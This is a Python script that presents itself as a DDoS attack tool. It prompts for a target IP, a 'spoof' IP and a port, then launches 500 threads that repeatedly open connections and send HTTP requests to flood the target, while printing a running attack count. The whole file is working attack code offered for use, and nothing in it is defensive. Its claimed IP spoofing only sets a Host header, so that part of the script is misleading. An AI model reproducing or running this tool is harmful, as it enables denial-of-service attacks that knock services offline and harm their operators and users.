import socket
import threading
import os
import time
import re

# Global variable to control attack threads
running = True

# Print banner
def print_banner():
    banner = """
  ____  _             _    
'########::'########::::'#####::::'######::
 ##.... ##: ##.... ##::'##.. ##::'##... ##:
 ##:::: ##: ##:::: ##:'##:::: ##: ##:::..::
 ##:::: ##: ##:::: ##: ##:::: ##:. ######::
 ##:::: ##: ##:::: ##: ##:::: ##::..... ##:
 ##:::: ##: ##:::: ##:. ##:: ##::'##::: ##:
 ########:: ########:::. #####:::. ######::
........:::........:::::.....:::::......:::
"""
    print(banner)

# Validate IP address format
def validate_ip(ip):
    pattern = r'^(\d{1,3}\.){3}\d{1,3}$'
    return re.match(pattern, ip)

# DDoS attack function
def attack(target, fake_ip, port_a):
    while running:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port_a))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port_a))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port_a))
        s.close()

def main():
    print_banner()

    global running

    threads = []

    try:
        # Validate target IP
        while True:
            target = input("Insert Target IP: ")
            if validate_ip(target):
                break
            else:
                print("Invalid target IP format. Please enter a valid IP address.")

        print("Target =", target)

        # Validate fake IP
        while True:
            fake_ip = input("Type in IP to spoof from for attack: ")
            if validate_ip(fake_ip):
                break
            else:
                print("Invalid fake IP format. Please enter a valid IP address.")

        port = input("Insert port to attack: ")
        port_a = int(port)

        # Prompt to start attack
        input("Press Enter to start the attack...")

        # Number of threads to run
        num_threads = 500

        for _ in range(num_threads):
            thread = threading.Thread(target=attack, args=(target, fake_ip, port_a))
            thread.daemon = True  # Set the thread as daemon
            thread.start()
            threads.append(thread)

        attack_num = 0

        while running:
            time.sleep(1)
            attack_num += num_threads
            print(f"Total attacks: {attack_num}")

    except KeyboardInterrupt:
        print("\nStopping the attack and exiting...")
        running = False
        

if __name__ == "__main__":
    main()
